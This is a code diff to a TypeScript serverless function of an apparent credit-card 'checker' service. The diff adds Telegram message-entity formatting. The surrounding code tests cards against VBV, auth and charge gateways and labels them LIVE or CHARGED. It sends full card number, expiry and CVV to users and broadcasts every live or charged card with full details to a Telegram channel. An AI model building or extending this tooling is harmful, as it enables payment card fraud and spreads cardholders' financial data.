@@ -92,7 +92,7 @@ async function lookupBin(bin: string): Promise<BinInfo> {
     console.error("BIN lookup error:", error);
   }
 
-  // Fallback detection
+// Fallback detection
   if (/^4/.test(bin)) {
     defaultInfo.brand = "VISA";
   } else if (/^5[1-5]/.test(bin) || /^2[2-7]/.test(bin)) {
@@ -104,6 +104,66 @@ async function lookupBin(bin: string): Promise<BinInfo> {
   }
 
   return defaultInfo;
+}
+
+// ========== ENTITY-BASED MESSAGE BUILDER ==========
+interface TelegramEntity {
+  type: string;
+  offset: number;
+  length: number;
+  custom_emoji_id?: string;
+}
+
+// Calculate UTF-16 length (Telegram Bot API uses UTF-16 offsets)
+function utf16Length(str: string): number {
+  let len = 0;
+  for (const char of str) {
+    len += char.codePointAt(0)! > 0xFFFF ? 2 : 1;
+  }
+  return len;
+}
+
+// Parse message: strip <code> HTML tags → code entities, ✅ → custom_emoji entities
+function parseMessageEntities(text: string): { plainText: string; entities: TelegramEntity[] } {
+  const entities: TelegramEntity[] = [];
+  let plainText = '';
+  let i = 0;
+
+  // Strip <code>...</code> tags and record as code entities
+  while (i < text.length) {
+    if (text.startsWith('<code>', i)) {
+      const closeIdx = text.indexOf('</code>', i + 6);
+      if (closeIdx !== -1) {
+        const content = text.slice(i + 6, closeIdx);
+        const offset = utf16Length(plainText);
+        entities.push({ type: 'code', offset, length: utf16Length(content) });
+        plainText += content;
+        i = closeIdx + 7;
+        continue;
+      }
+    }
+    plainText += text[i];
+    i++;
+  }
+
+  // Find all ✅ characters and add custom_emoji entities
+  let utf16Offset = 0;
+  for (const char of plainText) {
+    if (char === '✅') {
+      entities.push({
+        type: 'custom_emoji',
+        offset: utf16Offset,
+        length: 1, // ✅ U+2705 is 1 UTF-16 unit
+        custom_emoji_id: '5336985409220001678',
+      });
+    }
+    utf16Offset += char.codePointAt(0)! > 0xFFFF ? 2 : 1;
+  }
+
+  // Sort entities by offset
+  entities.sort((a, b) => a.offset - b.offset);
+
+  return { plainText, entities };
 }
 
 // Fallback anime GIFs in case Tenor API fails
@@ -161,62 +221,75 @@ async function getRandomAnimeGif(): Promise<string> {
   }
 }
 
-// Send Telegram animation with caption
-async function sendTelegramAnimation(chatId: string, gifUrl: string, caption: string): Promise<boolean> {
+// Send Telegram animation with caption (entities-based, no parse_mode)
+async function sendTelegramAnimation(chatId: string, gifUrl: string, caption: string, captionEntities?: TelegramEntity[]): Promise<boolean> {
   if (!TELEGRAM_BOT_TOKEN) {
     console.log("Telegram bot token not configured");
     return false;
   }
 
   try {
+    const body: Record<string, unknown> = {
+      chat_id: chatId,
+      animation: gifUrl,
+    };
+
+    if (captionEntities && captionEntities.length > 0) {
+      body.caption = caption;
+      body.caption_entities = captionEntities;
+    } else {
+      body.caption = caption;
+      body.parse_mode = "HTML";
+    }
+
     const response = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAnimation`,
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          animation: gifUrl,
-          caption: caption,
-          parse_mode: "HTML",
-        }),
+        body: JSON.stringify(body),
       }
     );
 
     if (!response.ok) {
       const errorData = await response.json();
       console.error("Telegram API error:", errorData);
-      // Fallback to text message if animation fails
-      return await sendTelegramMessage(chatId, caption);
+      return await sendTelegramMessage(chatId, caption, captionEntities);
     }
 
     console.log("Telegram animation sent successfully to:", chatId);
     return true;
   } catch (error) {
     console.error("Error sending Telegram animation:", error);
-    // Fallback to text message
-    return await sendTelegramMessage(chatId, caption);
+    return await sendTelegramMessage(chatId, caption, captionEntities);
   }
 }
 
-// Send Telegram message (fallback)
-async function sendTelegramMessage(chatId: string, message: string): Promise<boolean> {
+// Send Telegram message (fallback, entities-based)
+async function sendTelegramMessage(chatId: string, message: string, messageEntities?: TelegramEntity[]): Promise<boolean> {
   if (!TELEGRAM_BOT_TOKEN) {
     console.log("Telegram bot token not configured");
     return false;
   }
 
   try {
+    const body: Record<string, unknown> = {
+      chat_id: chatId,
+      text: message,
+    };
+
+    if (messageEntities && messageEntities.length > 0) {
+      body.entities = messageEntities;
+    } else {
+      body.parse_mode = "HTML";
+    }
+
     const response = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
+        body: JSON.stringify(body),
       }
     );
 
@@ -437,12 +510,12 @@ serve(async (req) => {
     
     // VBV shows PASSED, other auth shows LIVE, charge shows CHARGED
     const statusLabel = isVbvGateway ? 'PASSED' : (isChargeGateway ? 'CHARGED' : (isAuthGateway ? 'LIVE' : 'CHARGED'));
-    const premiumCheck = '<tg-emoji emoji-id="5336985409220001678">✅</tg-emoji>';
+    // Use plain ✅ - it will be replaced with custom_emoji entity by parseMessageEntities()
     const statusLine = isVbvGateway
-      ? `${premiumCheck} ${toFancyBold('PASSED')}`
+      ? `✅ ${toFancyBold('PASSED')}`
       : (isChargeGateway 
-        ? `${premiumCheck} ${toFancyBold('CHARGED')} • 💰 ${amount}`
-        : (isAuthGateway ? `${premiumCheck} ${toFancyBold('LIVE')}` : `${premiumCheck} ${toFancyBold('CHARGED')} • 💰 ${amount}`));
+        ? `✅ ${toFancyBold('CHARGED')} • 💰 ${amount}`
+        : (isAuthGateway ? `✅ ${toFancyBold('LIVE')}` : `✅ ${toFancyBold('CHARGED')} • 💰 ${amount}`));
     
     // 🔥 Show FULL card details for LIVE/CHARGED cards (user's card, they need full info)
     const fullCard = `${cardNum}|${mm}|${yy}|${cvv}`;
@@ -485,16 +558,18 @@ ${countryFlag} ${toFancyBold('Country')}: ${binInfo.country}
 
 ${toFancyScript('Yunchi')} ⚡`.trim();
 
+    // Parse messages into plain text + entities (custom emoji + code blocks)
+    const parsedUserMsg = parseMessageEntities(message);
+    const parsedChannelMsg = parseMessageEntities(channelMessage);
+
     // Send notification to user with full card details and random anime GIF
-    const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, message);
+    const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, parsedUserMsg.plainText, parsedUserMsg.entities);
     
     // Broadcast ALL live/charged cards to channel (no exclusions)
-    // Get a second random GIF for channel broadcast
     const channelGif = await getRandomAnimeGif();
     
-    // Broadcast to live cards channel with full details and GIF
     console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID, "Gateway:", gateway);
-    const sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, channelMessage);
+    const sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, parsedChannelMsg.plainText, parsedChannelMsg.entities);
 
     return new Response(
       JSON.stringify({ 
